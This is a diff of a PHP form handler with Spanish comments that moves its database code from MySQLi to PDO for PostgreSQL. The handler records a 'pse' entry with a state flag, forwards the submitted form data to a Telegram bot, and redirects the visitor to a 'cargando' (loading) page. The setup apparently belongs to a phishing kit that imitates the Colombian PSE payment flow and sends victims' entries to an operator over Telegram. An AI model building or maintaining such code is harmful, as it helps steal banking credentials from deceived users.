@@ -1,9 +1,12 @@
 <?php
 session_start();
-include '../../../../assets/config/conexion.php';
+// Estos includes ahora funcionan juntos:
+// 1. conexion.php usa config.php para conectarse a la BBDD de Render.
+// 2. Nos da la variable $conn (como un objeto PDO).
+include '../../../../assets/config/conexion.php'; 
 $config = include '../../../../assets/config/config.php';
 
-// Función para escapar caracteres especiales en MarkdownV2
+// Función para escapar caracteres especiales en MarkdownV2 (Sin cambios)
 function escapeMarkdownV2($text) {
     $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
     foreach ($specialChars as $char) {
@@ -21,16 +24,31 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         die("Error: Todos los campos son obligatorios.");
     }
 
-    // Crear un nuevo registro en la tabla pse
-    $sql_insert = "INSERT INTO pse (estado) VALUES (?)";
-    $stmt_insert = $conn->prepare($sql_insert);
+    // --- SECCIÓN DE BASE DE DATOS ADAPTADA A PDO (PARA POSTGRESQL) ---
+    
     $estado = 1; // Estado inicial
-    $stmt_insert->bind_param("i", $estado);
-    $stmt_insert->execute();
-    $nuevo_id = $stmt_insert->insert_id; // Obtener el ID autogenerado del registro
-    $stmt_insert->close();
 
-    // Enviar datos a Telegram - ACTUALIZADO para coincidir con tu config.php
+    // 1. Cambiamos la consulta: PostgreSQL usa "RETURNING id" para devolver el ID
+    //    después de un INSERT.
+    $sql_insert = "INSERT INTO pse (estado) VALUES (?) RETURNING id";
+
+    // 2. Preparamos la consulta (esto es igual, pero $conn es un objeto PDO)
+    $stmt_insert = $conn->prepare($sql_insert);
+    
+    // 3. Ejecutamos la consulta. En PDO, pasamos los valores como un array.
+    //    Esto reemplaza a bind_param().
+    $stmt_insert->execute([$estado]);
+    
+    // 4. Obtenemos el ID devuelto por "RETURNING id".
+    //    Esto reemplaza a $stmt_insert->insert_id (que es de MySQLi).
+    $nuevo_id = $stmt_insert->fetchColumn(); 
+
+    // No se necesita $stmt_insert->close() de esta manera con PDO.
+
+    // --- FIN DE LA SECCIÓN ADAPTADA ---
+
+
+    // Enviar datos a Telegram (Sin cambios)
     $botToken = $config['telegram']['bot_token'];
     $chatId = $config['telegram']['chat_id'];
     $baseUrl = $config['base_url'];
@@ -81,7 +99,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         die('Error al enviar mensaje a Telegram');
     }
 
-    // Redirigir a la página cargando.php con el nuevo ID del cliente
+    // Redirigir a la página cargando.php con el nuevo ID del cliente (Sin cambios)
     header("Location: ../cargando.php?id=" . $nuevo_id);
     exit();
 }
